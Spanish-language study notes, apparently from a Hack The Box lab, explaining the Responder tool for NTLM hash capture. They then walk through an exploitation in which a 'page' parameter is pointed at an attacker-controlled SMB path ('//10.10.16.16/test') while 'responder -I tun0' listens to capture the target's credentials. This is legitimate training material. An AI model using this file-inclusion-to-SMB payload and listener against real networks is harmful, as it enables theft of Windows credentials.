La utilidad **Responder** en Linux es una herramienta usada en **pentesting de redes Windows**, especialmente en ataques a protocolos de red que usan **autenticación NTLM**.
**Responder** actúa como un servidor malicioso en la red local. Su objetivo es **capturar credenciales NTLM** enviadas automáticamente por máquinas Windows vulnerables que intentan resolver nombres por la red.

---

### 📌 Usos principales:

1. **Capturar hashes NTLMv1/NTLMv2** para crackeo offline
2. **Responder a peticiones de protocolos como:**
    - LLMNR (Link-Local Multicast Name Resolution)
    - NBT-NS (NetBIOS Name Service)
    - MDNS
    - WPAD (Web Proxy Auto Discovery)
3. **Realizar ataques de spoofing o relay**, como:
    - Servir archivos falsos por SMB
    - Redirigir tráfico web
    - Montar ataques tipo _Man-in-the-Middle_

-------
# Explotacion

Donde dice el idioma arriba al aderecha que aparece el boton *EN* vamos a cambiar de idioma a por ejemplo *FR*
![[Responder10.png]]
Vemos que con otro idioma nos redirecciona a un link: http://unika.htb/index.php?page=french.html
![[Responder9.png]]

#### Escucha con [[Herramientas-Comandos/NTLM/Responder|Responder]]
```shell
responder -I tun0
```
*Parametro:*
	`-I` Interfaz de red que la podemos chequear con el parametro [[ifconfig]]

Estando en escucha con el responder entramos a este link `http://unika.htb/?page=//10.10.16.16/test` para que envie una peition y interceptarla (El archivo test no existe)
![[Responder11.png]]

El [[Herramientas-Comandos/NTLM/Responder|Responder]] va a interceptar esta informacion
![[Responder12.png]]

El resultado se va a almacenar en el archivo ubicado en el directorio `/usr/share/responder/logs`